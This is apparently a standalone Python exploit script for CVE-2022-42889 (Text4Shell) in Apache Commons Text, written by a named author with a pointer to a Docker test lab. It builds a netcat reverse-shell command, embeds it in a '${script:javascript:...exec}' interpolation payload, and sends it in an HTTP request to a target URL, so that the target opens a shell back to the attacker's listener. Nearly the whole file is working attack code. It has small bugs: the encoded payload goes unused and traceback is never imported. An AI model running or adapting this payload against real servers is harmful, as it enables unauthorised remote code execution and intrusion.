#!/usr/bin/python3

################################################################################
# name: cve-2022-42889.py
# Desc: Python script to exploit CVE-2022-42889 
# Author: S3L33
# Testing POC: https://github.com/karthikuj/cve-2022-42889-text4shell-docker
#
################################################################################

#import necessary libraries
import requests
import urllib.parse
import sys

#setting global vars
LHOST = ""
LPORT = ""
URI = ""



# Function to generate our payload with user args
def generate_payload(LHOST, LPORT, URI):

    # generate the netcat reverse shell
    CMD = "nc {0} {1} -e /bin/sh".format(LHOST, LPORT)
    print("[+] - Netcat reverse shell generated: {0}\r\n".format(CMD))

    # Generate the payload with the populated netcat reverse shell
    payload = "${script:javascript:java.lang.Runtime.getRuntime().exec('%s')}" % CMD
    print("[+] - Reverse Shell added to malicious Payload: {0}\r\n".format(payload))

    # URL Encode the payload
    # example: %24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%20172.17.0.1%209001%20-e%20/bin/sh%27%29%7D
    encoded = urllib.parse.quote(payload)
    print("[+] - URL Encoded Payload: {0}\r\n".format(encoded))

    # combine the payload with the target URI
    # example: http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%20172.17.0.1%209001%20-e%20/bin/sh%27%29%7D 
    request_payload = URI + payload
    print("[+] - Malicious request generated:\r\n{0}".format(request_payload))
    return request_payload

print("\r\n##############################\n# Running CVE-2022-42889 RCE #\n##############################\r\n")

# Run exploit
try:
    # check for 0 arguements and print help
    if len(sys.argv) <= 3:
        print("Usage:\n./cve-2022-42889.py <listening ip> <listening port> <target url>\n\r example: ./cve-2022-42889.py 127.0.0.1 4444 http://localhost/vulnerable?search=")

    # if arguements recieved run exploit
    else:
        # run payload generator and return 
        malicious_payload = generate_payload(sys.argv[1], sys.argv[2], sys.argv[3])
        print("\r\n[+] - Sending Malicious Payload..")

        #send payload to target
        malicious_request = requests.get(malicious_payload)
        if len(malicious_request.text) > 0:
            print("\r\n[+] - Payload Sent! Did we get a shell?")
        else:
            print("[+] - We never got a response.")
except Exception:
    print(traceback.print_exc())
